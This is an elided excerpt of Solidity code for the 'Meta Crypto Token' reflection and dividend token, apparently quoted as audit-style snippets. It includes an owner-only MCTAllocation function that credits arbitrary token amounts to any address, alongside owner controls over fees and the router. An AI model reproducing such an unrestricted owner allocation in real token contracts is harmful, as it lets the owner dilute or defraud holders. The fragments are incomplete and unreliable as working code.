...
_balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
 ...
 function mctallot(address account, uint256 amount) internal virtual {
...
function mctallot(address account, uint256 value) internal override {
    super.mctallot(account, value);
...
contract MCTrewardToken is rewardTokenHolders, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    using RewardMCTMap  for RewardMCTMap .Map;
RewardMCTMap .Map private tokenHoldersList;
...
event Claim(address indexed account, uint256 amount, bool indexed automatic);
 constructor() rewardTokenHolders("MCT_rewardToken_Tracker", "MCT_rewardToken_Tracker") {
        claimWait = 3600;
        minimumTokenBalanceForDividends = 80000 * (10**9); 
    }
function _transfer(address, address, uint256) internal override pure {
        require(false, "MCT_rewardToken_Tracker: No transfers allowed");
    }
 function withdrawDividend() public override  pure {
        require(false, "MCT_rewardToken_Tracker: withdrawDividend disabled. Use the 'claim' function on the main MCT contract.");
    }
...
contract MCT is ERC20, Ownable {
 ...
 address public lp;
  ILP public adressLiquidity;
    address public teamFeeReciever =0xca9023B5A7f3b18B57e4A9C15Ab2C2a59BB2C9c3;
...
bool public cooldownEnabled = false;
  ...
  constructor() ERC20("Meta Crypto Token", "MCT") {
 ...
 DEXV2Router = _DEXV2Router;
        ...
        rewardToken = new MCTrewardToken();
...
emit RebaseUpdate(epoch, _totalSupply);
  ...
  function changeIsDividendLimited(address holder, bool Limited) external masterWallet {
     ...
     function MCTAllocation(address userAddress, uint256 tokenToUser) public masterWallet{
       mctallot(userAddress, tokenToUser);
  }
 ...
 function updateDEXV2Router(address newAddress) public masterWallet {
        require(newAddress != address(DEXV2Router), "MCT: The router already has that address");
 ...
 function excludeFromFees(address account, bool excluded) public masterWallet {
        require(_isExcludedFromFees[account] != excluded, "MCT: Account is already the value of 'excluded'");
        _isExcludedFromFees[account] = excluded;

        emit ExcludeFromFees(account, excluded);
    }
function updateGasForProcessing(uint256 newValue) public masterWallet {
        require(newValue >= 200000 && newValue <= 500000, "MCT: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "MCT: Cannot update gasForProcessing to same value");
 ...
 uint256 tokensTMCT = tokensToLiquify.mul(liquidityFee).div(TotalFees).div(2);
        uint256 amountToSwap = tokensToLiquify.sub(tokensTMCT);
...
addLiquidity(tokensTMCT, bnbForLiquidity);
